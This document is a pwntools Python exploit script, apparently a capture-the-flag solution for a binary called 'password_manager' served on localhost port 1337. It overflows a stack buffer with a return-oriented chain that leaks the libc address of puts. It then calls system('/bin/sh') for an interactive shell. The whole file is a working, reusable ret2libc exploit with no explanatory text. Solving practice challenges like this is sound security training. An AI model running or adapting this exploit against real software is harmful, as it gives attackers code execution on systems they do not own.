#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './password_manager_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '127.0.0.1', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec password_manager
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

RET = 0x0000000000401016
POP_RDI = 0x00000000004018f8

def exploit():
    global io
    io = initialize()

    offset = 0x88
    payload = flat({
        offset: [
            POP_RDI,
            elf.got['puts'],
            elf.plt['puts'],
            elf.symbols['main']
        ]
    })
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', payload)

    io.recvuntil(b'Wrong authentication\n')
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']

    payload = flat({
        offset: [
            POP_RDI,
            next(libc.search(b'/bin/sh\x00')),
            RET,
            libc.sym['system']
        ]
    })
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', payload)

    log.info('leak: %#x', leak)
    log.info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
